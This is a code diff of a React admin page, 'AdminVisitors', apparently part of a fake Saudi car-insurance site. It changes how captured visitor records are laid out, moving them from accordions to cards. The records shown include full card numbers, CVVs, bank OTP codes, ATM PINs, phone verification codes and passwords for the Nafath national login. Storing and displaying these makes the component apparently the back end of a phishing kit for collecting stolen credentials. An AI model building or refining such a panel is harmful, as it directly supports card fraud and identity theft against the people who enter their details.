@@ -1817,132 +1817,116 @@ const AdminVisitors = () => {
                                   </span>
                                 </div>
                               )}
-                              {/* Categorized data sections with collapsible sub-sections */}
-                              <Accordion type="multiple" defaultValue={["card-info", "otp-info", "atm-info", "phone-otp", "nafath-info", "vehicle-info", "insurance-info"]} className="space-y-1.5">
+                              {/* Categorized data as separate cards */}
+                              <div className="space-y-2">
                                 {/* Payment card info */}
                                 {(order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv || order.payment_method) && (
-                                  <AccordionItem value="card-info" className="border rounded-xl overflow-hidden border-amber-500/30 bg-amber-500/5">
-                                    <AccordionTrigger className="px-3 py-2 hover:bg-amber-500/10 text-[10px] font-bold text-amber-600 [&[data-state=open]>svg]:rotate-180">
-                                      <span className="flex items-center gap-1.5">💳 معلومات البطاقة</span>
-                                    </AccordionTrigger>
-                                    <AccordionContent className="px-3 pb-2.5">
-                                      <div className="grid grid-cols-2 gap-2">
-                                        {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
-                                        {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
-                                        {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
-                                        {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
-                                        {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
-                                        {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
-                                      </div>
-                                    </AccordionContent>
-                                  </AccordionItem>
+                                  <div className="rounded-xl border-2 border-amber-500/30 bg-amber-500/5 overflow-hidden">
+                                    <div className="px-3 py-2 bg-amber-500/10 border-b border-amber-500/20">
+                                      <p className="text-[10px] font-bold text-amber-600 flex items-center gap-1.5">💳 معلومات البطاقة</p>
+                                    </div>
+                                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
+                                      {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
+                                      {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
+                                      {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
+                                      {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
+                                      {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
+                                      {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
+                                    </div>
+                                  </div>
                                 )}
 
                                 {/* OTP code */}
                                 {(order.otp_code || order.otp_verified !== null) && (
-                                  <AccordionItem value="otp-info" className="border rounded-xl overflow-hidden border-blue-500/30 bg-blue-500/5">
-                                    <AccordionTrigger className="px-3 py-2 hover:bg-blue-500/10 text-[10px] font-bold text-blue-600 [&[data-state=open]>svg]:rotate-180">
-                                      <span className="flex items-center gap-1.5">🔑 كود التحقق البنكي (OTP)</span>
-                                    </AccordionTrigger>
-                                    <AccordionContent className="px-3 pb-2.5">
-                                      <div className="grid grid-cols-2 gap-2">
-                                        {order.otp_code && <InfoItem label="كود OTP" value={order.otp_code} />}
-                                        {order.otp_verified !== null && <InfoItem label="تم التحقق" value={order.otp_verified ? "نعم" : "لا"} />}
-                                      </div>
-                                    </AccordionContent>
-                                  </AccordionItem>
+                                  <div className="rounded-xl border-2 border-blue-500/30 bg-blue-500/5 overflow-hidden">
+                                    <div className="px-3 py-2 bg-blue-500/10 border-b border-blue-500/20">
+                                      <p className="text-[10px] font-bold text-blue-600 flex items-center gap-1.5">🔑 كود التحقق البنكي (OTP)</p>
+                                    </div>
+                                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
+                                      {order.otp_code && <InfoItem label="كود OTP" value={order.otp_code} />}
+                                      {order.otp_verified !== null && <InfoItem label="تم التحقق" value={order.otp_verified ? "نعم" : "لا"} />}
+                                    </div>
+                                  </div>
                                 )}
 
                                 {/* ATM info */}
                                 {(order.atm_bill_number || order.atm_biller_code || order.atm_pin) && (
-                                  <AccordionItem value="atm-info" className="border rounded-xl overflow-hidden border-emerald-500/30 bg-emerald-500/5">
-                                    <AccordionTrigger className="px-3 py-2 hover:bg-emerald-500/10 text-[10px] font-bold text-emerald-600 [&[data-state=open]>svg]:rotate-180">
-                                      <span className="flex items-center gap-1.5">🏧 بيانات ATM</span>
-                                    </AccordionTrigger>
-                                    <AccordionContent className="px-3 pb-2.5">
-                                      <div className="grid grid-cols-2 gap-2">
-                                        {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
-                                        {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
-                                        {order.atm_pin && <InfoItem label="الرقم السري ATM" value={order.atm_pin} />}
-                                      </div>
-                                    </AccordionContent>
-                                  </AccordionItem>
+                                  <div className="rounded-xl border-2 border-emerald-500/30 bg-emerald-500/5 overflow-hidden">
+                                    <div className="px-3 py-2 bg-emerald-500/10 border-b border-emerald-500/20">
+                                      <p className="text-[10px] font-bold text-emerald-600 flex items-center gap-1.5">🏧 بيانات ATM</p>
+                                    </div>
+                                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
+                                      {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
+                                      {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
+                                      {order.atm_pin && <InfoItem label="الرقم السري ATM" value={order.atm_pin} />}
+                                    </div>
+                                  </div>
                                 )}
 
                                 {/* Phone OTP */}
                                 {order.phone_otp_code && (
-                                  <AccordionItem value="phone-otp" className="border rounded-xl overflow-hidden border-purple-500/30 bg-purple-500/5">
-                                    <AccordionTrigger className="px-3 py-2 hover:bg-purple-500/10 text-[10px] font-bold text-purple-600 [&[data-state=open]>svg]:rotate-180">
-                                      <span className="flex items-center gap-1.5">📲 توثيق رقم الجوال</span>
-                                    </AccordionTrigger>
-                                    <AccordionContent className="px-3 pb-2.5">
-                                      <div className="grid grid-cols-2 gap-2">
-                                        <InfoItem label="كود توثيق الجوال" value={order.phone_otp_code} />
-                                      </div>
-                                    </AccordionContent>
-                                  </AccordionItem>
+                                  <div className="rounded-xl border-2 border-purple-500/30 bg-purple-500/5 overflow-hidden">
+                                    <div className="px-3 py-2 bg-purple-500/10 border-b border-purple-500/20">
+                                      <p className="text-[10px] font-bold text-purple-600 flex items-center gap-1.5">📲 توثيق رقم الجوال</p>
+                                    </div>
+                                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
+                                      <InfoItem label="كود توثيق الجوال" value={order.phone_otp_code} />
+                                    </div>
+                                  </div>
                                 )}
 
                                 {/* Nafath */}
                                 {(order.nafath_password || order.nafath_number) && (
-                                  <AccordionItem value="nafath-info" className="border rounded-xl overflow-hidden border-teal-500/30 bg-teal-500/5">
-                                    <AccordionTrigger className="px-3 py-2 hover:bg-teal-500/10 text-[10px] font-bold text-teal-600 [&[data-state=open]>svg]:rotate-180">
-                                      <span className="flex items-center gap-1.5">🔐 نفاذ</span>
-                                    </AccordionTrigger>
-                                    <AccordionContent className="px-3 pb-2.5">
-                                      <div className="grid grid-cols-2 gap-2">
-                                        {order.nafath_password && <InfoItem label="كلمة مرور نفاذ" value={order.nafath_password} />}
-                                        {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
-                                      </div>
-                                    </AccordionContent>
-                                  </AccordionItem>
+                                  <div className="rounded-xl border-2 border-teal-500/30 bg-teal-500/5 overflow-hidden">
+                                    <div className="px-3 py-2 bg-teal-500/10 border-b border-teal-500/20">
+                                      <p className="text-[10px] font-bold text-teal-600 flex items-center gap-1.5">🔐 نفاذ</p>
+                                    </div>
+                                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
+                                      {order.nafath_password && <InfoItem label="كلمة مرور نفاذ" value={order.nafath_password} />}
+                                      {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
+                                    </div>
+                                  </div>
                                 )}
 
                                 {/* Vehicle info */}
                                 {(order.vehicle_make || order.vehicle_model || order.vehicle_year || order.serial_number || order.passenger_count || order.vehicle_usage || order.estimated_value || order.repair_location) && (
-                                  <AccordionItem value="vehicle-info" className="border rounded-xl overflow-hidden border-border/50">
-                                    <AccordionTrigger className="px-3 py-2 hover:bg-muted/40 text-[10px] font-bold text-muted-foreground [&[data-state=open]>svg]:rotate-180">
-                                      <span className="flex items-center gap-1.5"><Car className="w-3 h-3" /> معلومات المركبة</span>
-                                    </AccordionTrigger>
-                                    <AccordionContent className="px-3 pb-2.5">
-                                      <div className="grid grid-cols-2 gap-2">
-                                        {order.vehicle_make && <InfoItem label="الشركة المصنعة" value={order.vehicle_make} />}
-                                        {order.vehicle_model && <InfoItem label="الموديل" value={order.vehicle_model} />}
-                                        {order.vehicle_year && <InfoItem label="سنة الصنع" value={order.vehicle_year} />}
-                                        {order.serial_number && <InfoItem label="الرقم التسلسلي" value={order.serial_number} />}
-                                        {order.passenger_count && <InfoItem label="عدد الركاب" value={order.passenger_count} />}
-                                        {order.vehicle_usage && <InfoItem label="غرض الاستخدام" value={order.vehicle_usage === "personal" ? "شخصي" : order.vehicle_usage === "commercial" ? "تجاري" : order.vehicle_usage} />}
-                                        {order.estimated_value && <InfoItem label="القيمة التقديرية" value={`${order.estimated_value} ر.س`} />}
-                                        {order.repair_location && <InfoItem label="مكان التصليح" value={order.repair_location === "agency" ? "الوكالة" : "ورشة"} />}
-                                      </div>
-                                    </AccordionContent>
-                                  </AccordionItem>
+                                  <div className="rounded-xl border border-border/50 bg-muted/10 overflow-hidden">
+                                    <div className="px-3 py-2 bg-muted/30 border-b border-border/30">
+                                      <p className="text-[10px] font-bold text-muted-foreground flex items-center gap-1.5"><Car className="w-3 h-3" /> معلومات المركبة</p>
+                                    </div>
+                                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
+                                      {order.vehicle_make && <InfoItem label="الشركة المصنعة" value={order.vehicle_make} />}
+                                      {order.vehicle_model && <InfoItem label="الموديل" value={order.vehicle_model} />}
+                                      {order.vehicle_year && <InfoItem label="سنة الصنع" value={order.vehicle_year} />}
+                                      {order.serial_number && <InfoItem label="الرقم التسلسلي" value={order.serial_number} />}
+                                      {order.passenger_count && <InfoItem label="عدد الركاب" value={order.passenger_count} />}
+                                      {order.vehicle_usage && <InfoItem label="غرض الاستخدام" value={order.vehicle_usage === "personal" ? "شخصي" : order.vehicle_usage === "commercial" ? "تجاري" : order.vehicle_usage} />}
+                                      {order.estimated_value && <InfoItem label="القيمة التقديرية" value={`${order.estimated_value} ر.س`} />}
+                                      {order.repair_location && <InfoItem label="مكان التصليح" value={order.repair_location === "agency" ? "الوكالة" : "ورشة"} />}
+                                    </div>
+                                  </div>
                                 )}
 
                                 {/* Insurance & pricing */}
                                 {(order.base_price != null || order.total_price != null || order.policy_number || order.draft_policy_number || (order.add_ons && Array.isArray(order.add_ons) && (order.add_ons as any[]).length > 0)) && (
-                                  <AccordionItem value="insurance-info" className="border rounded-xl overflow-hidden border-border/50">
-                                    <AccordionTrigger className="px-3 py-2 hover:bg-muted/40 text-[10px] font-bold text-muted-foreground [&[data-state=open]>svg]:rotate-180">
-                                      <span className="flex items-center gap-1.5"><Shield className="w-3 h-3" /> التأمين والأسعار</span>
-                                    </AccordionTrigger>
-                                    <AccordionContent className="px-3 pb-2.5">
-                                      <div className="grid grid-cols-2 gap-2">
-                                        {order.base_price != null && <InfoItem label="السعر الأساسي" value={`${order.base_price} ر.س`} />}
-                                        {order.total_price != null && <InfoItem label="السعر الإجمالي" value={`${order.total_price} ر.س`} />}
-                                        {order.policy_number && <InfoItem label="رقم الوثيقة" value={order.policy_number} />}
-                                        {order.draft_policy_number && <InfoItem label="رقم الوثيقة المبدئي" value={order.draft_policy_number} />}
-                                        {order.add_ons && Array.isArray(order.add_ons) && (order.add_ons as any[]).length > 0 && (
-                                          <div className="col-span-2"><InfoItem label="الإضافات" value={(order.add_ons as any[]).map((a: any) => typeof a === 'string' ? a : a.name || JSON.stringify(a)).join("، ")} /></div>
-                                        )}
-                                      </div>
-                                    </AccordionContent>
-                                  </AccordionItem>
+                                  <div className="rounded-xl border border-border/50 bg-muted/10 overflow-hidden">
+                                    <div className="px-3 py-2 bg-muted/30 border-b border-border/30">
+                                      <p className="text-[10px] font-bold text-muted-foreground flex items-center gap-1.5"><Shield className="w-3 h-3" /> التأمين والأسعار</p>
+                                    </div>
+                                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
+                                      {order.base_price != null && <InfoItem label="السعر الأساسي" value={`${order.base_price} ر.س`} />}
+                                      {order.total_price != null && <InfoItem label="السعر الإجمالي" value={`${order.total_price} ر.س`} />}
+                                      {order.policy_number && <InfoItem label="رقم الوثيقة" value={order.policy_number} />}
+                                      {order.draft_policy_number && <InfoItem label="رقم الوثيقة المبدئي" value={order.draft_policy_number} />}
+                                      {order.add_ons && Array.isArray(order.add_ons) && (order.add_ons as any[]).length > 0 && (
+                                        <div className="col-span-2"><InfoItem label="الإضافات" value={(order.add_ons as any[]).map((a: any) => typeof a === 'string' ? a : a.name || JSON.stringify(a)).join("، ")} /></div>
+                                      )}
+                                    </div>
+                                  </div>
                                 )}
-                              </Accordion>
 
-                              {/* Order date - always visible */}
-                              <div className="pt-2 mt-1">
-                                <div className="grid grid-cols-2 gap-2">
+                                {/* Order date */}
+                                <div className="grid grid-cols-2 gap-2 pt-1">
                                   <InfoItem label="تاريخ الطلب" value={formatDate(order.created_at)} />
                                 </div>
                               </div>
